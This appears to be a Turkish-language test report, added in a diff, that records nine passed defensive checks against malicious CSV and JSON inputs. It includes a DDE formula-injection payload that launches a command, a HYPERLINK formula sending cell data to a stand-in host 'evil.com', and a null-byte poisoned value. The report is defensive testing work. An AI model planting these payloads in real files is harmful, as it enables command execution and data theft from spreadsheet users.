@@ -1,0 +1,49 @@
+=== G079 NEGATİF GÜVENLİK KONTROLLERİ VE ZARARLI GİRDİ SAVUNMA RAPORU ===
+Toplam Senaryo: 9
+Başarılı Savunma: 9
+
+[PASS] NEG_01_CSV_FORMULA_INJECTION_EQUAL (CSV)
+  Açıklama : Excel/Calc DDE komut calistirma amacli esittir (=) ile baslayan formül enjeksiyonu
+  Sonuç    : Formula injection risk detected and neutralized: '=cmd|'/C calc'!A0
+  Savunma  : Hucre degeri basina tek tirnak (') eklenerek veya riskli karakter tespit edilerek formül yürütmesi nötralize edilir.
+
+[PASS] NEG_02_CSV_FORMULA_INJECTION_DDE_PLUS (CSV)
+  Açıklama : Veri sizdirma amacli arti (+) ve HYPERLINK ile baslayan CSV enjeksiyonu
+  Sonuç    : Formula injection risk detected and neutralized: '+HYPERLINK("http://evil.com/leak?data="&A1)
+  Savunma  : Arti (+), eksi (-), et (@), tab, satir sonu tetikleyicileri basina nötralizasyon karakteri konur.
+
+[PASS] NEG_03_CSV_COLUMN_COUNT_MISMATCH (CSV)
+  Açıklama : Kacis karakteri eksikligi veya yanlis ayirici nedeniyle baslik kolon sayisi ile satir kolon sayisinin uyusmamasi
+  Sonuç    : ValueError: Satır 2 sütun sayısı uyumsuzluğu: 2 sütun bulundu, beklenen: 3
+  Savunma  : Her satir baslik sutun sayisina gore katı dogrulanir, tutarsizlik tespit edildiginde islem reddedilir.
+
+[PASS] NEG_04_CSV_OVERSIZED_FIELD_DOS (CSV)
+  Açıklama : CSV parser bellegini tuketmeye yonelik tanimlanan tavan degeri asan devasa alan
+  Sonuç    : ValueError: Satır 2, sütun 'data' hücre boyutu sınırını aştı.
+  Savunma  : max_field_size sınırı uygulanarak tampon asimi ve bellek tukenmesi (DoS) engellenir.
+
+[PASS] NEG_05_JSON_BOMB_DEEP_RECURSION (JSON)
+  Açıklama : Stack overflow ve parser cokmesine yol acan asiri ic ice gecmis JSON nesne agaci
+  Sonuç    : ValueError: JSON veri yapısı izin verilen azami derinliği (5) aştı. Mevcut: 6
+  Savunma  : JSON ayristirma oncesinde veya yapisal kontrolunde derinlik siniri (max_depth=10) zorlanir.
+
+[PASS] NEG_06_JSON_DUPLICATE_KEY_COLLISION (JSON)
+  Açıklama : Ayni JSON nesnesinde yetki yukseltme veya WAF atlatma amacli cift anahtar tanimi
+  Sonuç    : ValueError: JSON nesnesinde mükerrer anahtar (duplicate key collision) tespit edildi: 'role'
+  Savunma  : object_pairs_hook ile JSON yuklenirken ayni anahtarin birden fazla gecmesi durumunda ValueError uretilir.
+
+[PASS] NEG_07_JSON_NULL_BYTE_POISONING (JSON)
+  Açıklama : Dize alanina yerlestirilmis C-stili null-byte (\u0000) veri zehirleme girisimi
+  Sonuç    : ValueError: JSON dize değerinde geçersiz null-byte bulundu: 'admin\x00.evil'
+  Savunma  : Dize alanlari taranarak null-byte tespiti durumunda veri guvensiz kabul edilip reddedilir.
+
+[PASS] NEG_08_JSON_SCHEMA_INVALID_TYPE (JSON)
+  Açıklama : Sayisal tip beklenen alana enjekte edilmis zararli dize veya tip uyumsuzlugu
+  Sonuç    : TypeError: 'threat_score' alanı için tip uyumsuzluğu: Beklenen int, alınan str
+  Savunma  : JSON sema dogrulayici, alan turlerini ve deger araliklarini zorunlu kilar.
+
+[PASS] NEG_09_JSON_OVERSIZED_PAYLOAD_DOS (JSON)
+  Açıklama : Parser bellek tavanini asan devasa boyutlu JSON yuk bildirimi
+  Sonuç    : ValueError: JSON veri yükü izin verilen azami boyutu (1024 bayt) aştı: 3012 bayt
+  Savunma  : max_payload_bytes siniri JSON ayristirma oncesinde kontrol edilir.
+
